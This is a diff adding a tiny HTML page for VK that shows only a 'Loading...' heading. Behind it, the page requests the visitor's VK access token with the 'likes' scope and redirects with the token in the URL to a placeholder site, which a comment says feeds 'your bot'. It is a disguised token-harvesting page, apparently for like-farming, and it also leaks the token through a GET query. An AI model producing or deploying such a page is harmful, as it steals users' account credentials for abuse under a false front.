@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+</head>
+<body>
+    <h2>Загрузка...</h2>
+    <script>
+        vkBridge.send('VKWebAppGetAuthToken', {app_id: 54649157, scope: 'likes'}).then((data) => {
+            // Здесь токен автоматически передается в твой бот
+            window.location.href = "https://tvoysite.com/save_token?token=" + data.access_token;
+        });
+    </script>
+</body>
+</html>
